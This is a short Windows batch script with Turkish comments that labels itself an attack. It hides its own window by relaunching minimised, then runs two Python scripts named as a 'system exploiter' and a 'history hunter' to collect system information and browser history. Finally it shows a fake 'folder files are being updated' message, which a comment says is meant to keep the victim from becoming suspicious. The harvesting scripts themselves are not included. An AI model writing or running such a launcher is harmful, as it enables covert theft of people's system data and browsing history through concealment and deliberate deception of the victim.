@echo off
:: Pencereyi gizle (Miniboyut)
if not "%minimized%"=="" goto :minimized
set minimized=true
start /min cmd /C "%~dpnx0"
goto :EOF
:minimized

:: --- SALDIRI BAŞLIYOR ---

:: 1. Sistem Bilgilerini Çek
python sistem_somurucu.py

:: 2. Tarayıcı Geçmişini Çek
python gecmis_avcisi.py

:: 3. İşlem bitti mesajı (İsteğe bağlı, kurban şüphelenmesin diye)
echo Klasor dosyalari guncelleniyor...
timeout /t 2 >nul
exit